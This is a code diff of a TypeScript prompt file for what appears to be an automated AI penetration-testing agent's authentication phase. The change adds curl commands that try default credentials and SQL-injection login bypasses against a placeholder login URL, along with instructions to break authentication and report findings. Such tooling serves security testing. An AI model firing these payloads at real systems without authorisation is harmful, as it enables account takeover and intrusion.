@@ -1,24 +1,27 @@
-/**
- * Auth Phase Prompt — injected during auth_session checklist section.
- * Covers registration, login, session management, CSRF, password reset.
- */
+export const AUTH_PHASE_PROMPT = `## Phase: Authentication Attacks
 
-export const AUTH_PHASE_PROMPT = `## Phase: Authentication & Session Testing
+**You MUST attempt to BREAK authentication. Do NOT just observe.**
 
-**Load skill:** memory_get(path: "skills/auth/SKILL.md")
+### ATTACK SEQUENCE:
+1. **Default credentials on login form:**
+   \`\`\`
+   curl -s -X POST "LOGIN_URL" -d "username=admin&password=admin"
+   curl -s -X POST "LOGIN_URL" -d "username=admin&password=password"
+   curl -s -X POST "LOGIN_URL" -d "username=guest&password=guest"
+   \`\`\`
 
-### WHAT YOU MUST TEST
-- Registration: duplicate accounts, weak passwords, email verification bypass
-- Login: brute force, credential stuffing, account lockout
-- Session: session fixation, token entropy, cookie flags (HttpOnly, Secure, SameSite)
-- CSRF: missing tokens, token reuse, bypass techniques
-- Password reset: token predictability, host header injection, race conditions
+2. **SQLi bypass on login:**
+   \`\`\`
+   curl -s -X POST "LOGIN_URL" -d "username=admin' OR '1'='1' --&password=x"
+   curl -s -X POST "LOGIN_URL" -d "username=admin'--&password=x"
+   \`\`\`
 
-### REPORT FINDINGS IMMEDIATELY
-Call **report_finding** for EACH confirmed issue. Do NOT batch multiple findings. Every finding must have:
-- detail: description + location + impact
-- poc: concrete evidence (actual request + response showing the bug)
-- confidence (0-100) + confidence_reason (min 20 chars)
+3. **If login bypass works → IMMEDIATELY call report_finding**, then test session manipulation.
+
+4. **Session attacks:** Check cookie flags (HttpOnly, Secure), test session fixation, test token reuse.
+
+### REPORT IMMEDIATELY
+Every successful bypass or session flaw → call report_finding with the exact curl command + response as POC.
 
 ### AFTER AUTH
-Call **update_pentest_phase** with checklist.auth_session=true. IMMEDIATELY proceed to access_control.`;
+Call update_pentest_phase with checklist.auth_session=true. Proceed to access_control.`;
